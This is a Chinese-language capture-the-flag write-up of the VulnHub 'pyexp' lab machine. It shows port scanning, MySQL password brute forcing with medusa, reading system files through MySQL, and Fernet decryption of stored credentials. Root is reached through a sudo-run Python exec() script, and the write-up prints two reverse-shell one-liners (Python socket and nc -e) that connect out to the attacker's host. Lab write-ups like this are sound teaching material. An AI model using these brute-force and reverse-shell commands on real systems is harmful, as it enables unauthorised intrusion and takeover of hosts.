17 Vulnhub Pyexp Writeup

hdfzzf
2022-04-27 (Updated: 2022-04-27)
内网渗透
MySQL密码爆破, python, sudo提权, vulnhub, 综合

该靶机难度不是很高，但是很有特点。

1. 靶机信息

靶机地址：

  • pyexp: 1 ~ VulnHub

注意：

  • 使用 WMware 运行虚拟机

难度：

  • 中

目标：

  • 取得root权限
  • 拿到2个flag

攻击方法：

  • 主机发现
  • 端口扫描
  • 信息收集
  • SSH密码爆破
  • MySQL密码爆破
  • MySQL执行代码
  • 编写解密代码
  • sudo权限漏洞
  • python函数
  • 本地提权

2. 渗透

kali：192.168.137.10

靶机: 192.168.137.11

2.1. 主机发现、端口扫描、端口服务发现

sudo arp-scan -l
sudo nmap -p- 192.168.137.11
sudo nmap -p1337,3306 -A 192.168.137.11

信息：

  • 1337端口的服务为ssh；
  • 3306端口的服务为MySQL，MariaDB是MySQL的一个分支；

很奇怪的是该靶机居然没有http服务！！！

2.2. MySQL密码爆破

可以先进行ssh密码爆破，因此此时不知道靶机上有哪些用户，可以先用root跑

时间非常的长，并且最终也跑不出来。

MySQL也有一个默认的用户root，但是此root并不是操作系统的root。输入如下命令进行爆破： 

medusa -h 192.168.137.11 -M mysql -u root -P rockyou.txt

（hydra出了点问题，使用medusa进行爆破也是一样的）

最终得到结果：

mysql
username: root
password: prettywoman

远程登录数据库： 

mysql -h 192.168.137.11 -u root -p

2.3. 信息收集

总所周知，MySQL是可以提权的，但是这里有一个问题就是，当前执行MySQL的用户是kali的用户，并不是靶机的用户，因此就算利用MySQL命令执行提权得到的也是kali的用户的权限。可以利用下述命令执行系统查看id就可以知道。

\! id <==> system id <==> select do_system('id') # 靶机上无法运行第三个

还可以读取MySQL的默认配置以及系统文件的内容，默认配置文件没有任何有用的信息，而/etc/passwd里面反而有信息

# 查看是否能够进行文件的读取和写入操作
show variables like 'secure_file_priv';

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

可以！

可以发现除了root之外，还有一个lucy用户。其实这里也可以再次进行ssh爆破，但是还是没结果。

其实也可以查看一下/home/lucy/.ssh/id_rsa，如果存在的话，就可以利用密钥登陆ssh，可惜不存在。

最终查看数据库发现有四个数据库 

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| data               |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.001 sec)

其中，只有第一个是后来生成的，而后面的三个都是MySQL自带的。查看第一个数据，发现有一个表fernet，里面的信息如下：

cred keyy
gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys= UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=

没有任何其他的信息了，那么信息应该就隐藏在上述表格中，因为cred和key看起来很像是密码和密钥。

2.4. get shell

这里其实卡了非常久，后来百度知道了fernet其实是python中用来加解密的一个库。

官方文档：Fernet (symmetric encryption) — Cryptography 38.0.0.dev1 documentation

可以尝试官方给的加密代码生成密钥和加密，会发现密钥和加密的字符串和keyy和cred非常类似。因此确定是利用fernet进行加密的。

有两种解密方法：

  1. 在线网站：Fernet (Decode)
  2. 编写python代码

前者比较简单：

后者演示：(如果利用官方的解密代码查看过生成的key和token，就会发现它们是byte型的，所以前面加b)

python3
from cryptography.fernet import Fernet
key = b'UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0='
token = b'gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys='
f.decrypt(token)

得到： 

b'lucy:wJ9`"Lemdv9[FEw-'

根据/etc/passwd的内容，猜测这是ssh登录的账号和密码： 

username: lucy
password: wJ9`"Lemdv9[FEw- # 这密码能爆破出来就有鬼了

切记要指定端口！！！

2.5. 权限提升

在信息收集的时候发现： 

sudo -l

查看一下该文件的权限配置 

lucy@pyexp:~$ ls -l /opt/exp.py
-rw-r--r-- 1 root root 49 Aug 10  2020 /opt/exp.py

读取文件内容： 

lucy@pyexp:~$ cat /opt/exp.py
uinput = raw_input('how are you?')
exec(uinput)

心里狂喜，exec是python的函数，可以执行python代码。并且该文件的属主为root，如果用该文件得到shell，那就成功提权到root。

输入如下命令直接提权：(提前用which确定一下是否有bash) 

import pty; pty.spawn("/bin/bash")

也可以利用之前python反弹shell的代码：(kali先监听) 

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.137.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])

还可以这么写反弹shell，效果和上面的一样。 

__import__('os').system('nc 192.168.137.10 4444 -e /bin/bash')

读取两个flag： 

// 1. /home/lucy/user.txt
8ca196f62e91847f07f8043b499bd9be

// 2. /root/root.txt
a7a7e80ff4920ff06f049012700c99a8

3. 总结

该靶机难度并不算高，非常有特点，以往的靶机都是通过web进行get shell，而这台靶机通过数据库信息来get shell。

主要的难点在能否知道fernet是python的加解密的库。
